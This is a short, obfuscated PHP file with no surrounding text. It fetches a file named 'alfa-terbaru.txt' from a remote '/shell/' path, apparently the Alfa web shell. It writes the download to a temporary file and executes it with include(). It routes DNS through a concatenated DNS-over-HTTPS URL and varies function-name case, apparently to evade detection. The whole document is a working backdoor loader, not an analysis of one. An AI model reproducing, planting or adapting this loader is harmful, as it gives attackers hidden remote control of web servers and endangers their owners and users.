<?php $url='https://marslogs.co.id/shell/shell/alfa-terbaru.txt';$dns='ht';$dns.='tps:/';$dns.='/cloud';$dns.='flare-';$dns.='dns.c';$dns.='om/dns';$dns.='-query';$ch=CurL_init ($url);if(defined('CURLOPT_DOH_URL')){curL_setOPT($ch,CURLOPT_DOH_URL,$dns);}cUrl_setOpt($ch,CURLOPT_RETURNTRANSFER,TRUE);Curl_seTOPt($ch,CURLOPT_SSL_VERIFYHOST,2);curL_seTopt ($ch,CURLOPT_SSL_VERIFYPEER,true);$res=curl_ExEC($ch);cuRl_close($ch);$tmp=TMPfIle();$path=streaM_Get_meTa_daTa($tmp);$path=$path['uri'];fprintf($tmp,'%s',$res);IncLude($path); ?>